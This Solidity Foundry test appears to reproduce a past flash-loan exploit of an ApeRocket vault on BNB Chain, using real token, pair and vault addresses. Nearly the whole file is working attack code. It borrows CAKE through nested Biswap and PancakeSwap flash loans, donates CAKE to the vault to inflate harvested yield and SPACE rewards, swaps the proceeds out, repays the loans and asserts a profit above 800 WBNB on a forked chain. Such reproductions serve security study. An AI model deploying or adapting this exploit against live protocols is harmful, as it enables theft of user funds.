// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IApeRocketVault {
    function deposit(
        uint256 amount
    ) external;
    function harvest() external;
    function getReward() external;
    function withdrawAll() external;
}

interface IApeRocketRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract ApeRocketAttacker {
    IERC20 private constant CAKE = IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant SPACE = IERC20(0xe486a69E432Fdc29622bF00315f6b34C99b45e80);

    Uni_Pair_V2 private constant BISWAP_PAIR = Uni_Pair_V2(0x3d94d03eb9ea2D4726886aB8Ac9fc0F18355Fd13);
    Uni_Pair_V2 private constant PANCAKE_PAIR = Uni_Pair_V2(0x804678fa97d91B974ec2af3c843270886528a9E6);
    IApeRocketVault private constant VAULT = IApeRocketVault(0x274B5B7868c848Ac690DC9b4011e9e7e29133700);
    IApeRocketRouter private constant APE_ROUTER = IApeRocketRouter(0xC0788A3aD43d79aa53B09c2EaCc313A787d1d607);
    IApeRocketRouter private constant PANCAKE_ROUTER = IApeRocketRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    uint256 private constant BISWAP_LOAN = 355_600_879_692_227_584_859_481;
    uint256 private constant PANCAKE_LOAN = 1_259_459_212_464_459_000_252_436;
    uint256 private constant DEPOSIT_AMOUNT = 509_143_298_240_252_559_364_400;

    function attack() external {
        BISWAP_PAIR.sync();
        BISWAP_PAIR.swap(BISWAP_LOAN, 0, address(this), hex"01");
    }

    function BiswapCall(
        address,
        uint256 amount0,
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == address(BISWAP_PAIR) && amount0 == BISWAP_LOAN, "invalid biswap callback");
        PANCAKE_PAIR.sync();
        PANCAKE_PAIR.swap(PANCAKE_LOAN, 0, address(this), hex"01");
    }

    function pancakeCall(
        address,
        uint256 amount0,
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == address(PANCAKE_PAIR) && amount0 == PANCAKE_LOAN, "invalid pancake callback");

        CAKE.approve(address(VAULT), DEPOSIT_AMOUNT);
        VAULT.deposit(DEPOSIT_AMOUNT);

        // The vault treats this direct CAKE donation as earned yield and uses
        // the manipulated CAKE/WBNB liquidity when minting SPACE rewards.
        CAKE.transfer(address(VAULT), CAKE.balanceOf(address(this)));
        VAULT.harvest();
        VAULT.getReward();
        VAULT.withdrawAll();

        SPACE.approve(address(APE_ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(SPACE);
        path[1] = address(WBNB);
        APE_ROUTER.swapExactTokensForTokens(SPACE.balanceOf(address(this)), 1, path, address(this), block.timestamp);

        WBNB.approve(address(PANCAKE_ROUTER), type(uint256).max);
        path[0] = address(WBNB);
        path[1] = address(CAKE);
        PANCAKE_ROUTER.swapExactTokensForTokens(WBNB.balanceOf(address(this)), 1, path, address(this), block.timestamp);

        CAKE.transfer(address(BISWAP_PAIR), 355_957_547_374_558_889_127_095);
        CAKE.transfer(address(PANCAKE_PAIR), 1_262_616_676_710_107_398_966_068);

        CAKE.approve(address(APE_ROUTER), type(uint256).max);
        path[0] = address(CAKE);
        path[1] = address(WBNB);
        APE_ROUTER.swapExactTokensForTokens(CAKE.balanceOf(address(this)), 1, path, address(this), block.timestamp);
    }
}

contract ApeRocketExploitTest is Test {
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function testExploit() public {
        vm.createSelectFork("bsc", 9_139_707);
        ApeRocketAttacker attacker = new ApeRocketAttacker();

        attacker.attack();
        assertGt(WBNB.balanceOf(address(attacker)), 800 ether);
    }
}
